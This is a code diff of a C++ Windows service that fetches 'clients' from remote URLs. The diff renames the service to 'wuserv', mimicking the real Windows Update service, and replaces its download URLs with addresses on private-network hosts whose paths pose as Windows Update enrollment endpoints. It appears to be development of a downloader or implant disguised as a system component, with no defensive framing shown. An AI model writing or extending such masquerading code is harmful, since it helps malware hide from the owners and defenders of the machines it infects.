@@ -11,8 +11,8 @@ std::wstring localDir;
 std::wstring fullUrl;
 
 std::vector<std::wstring> remoteUrls = {
-    L"http://10.0.10.114:8080/clients",
-    L"http://10.0.10.114:8080/clients",
+    L"http://192.168.14.102:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/client",
+    L"http://192.168.14.101:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/client",
 };
 
 void WINAPI ServiceCtrlHandler(DWORD ctrlCode)
@@ -28,7 +28,7 @@ void WINAPI ServiceCtrlHandler(DWORD ctrlCode)
 }
 
 void WINAPI ServiceMain(DWORD argc, LPSTR* argv) {
-    hStatusHandle = RegisterServiceCtrlHandler(L"SysUpdateSvc", ServiceCtrlHandler);
+    hStatusHandle = RegisterServiceCtrlHandler(L"wuserv", ServiceCtrlHandler);
     if (hStatusHandle == NULL) {
         return;
     }
@@ -40,7 +40,7 @@ void WINAPI ServiceMain(DWORD argc, LPSTR* argv) {
 
     // Read parameters from the registry
     HKEY hKey;
-    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\SysUpdateSvc", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\wuserv", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
         DWORD dwSize;
         wchar_t szRemoteUrl[256], szLocalDir[256];
 
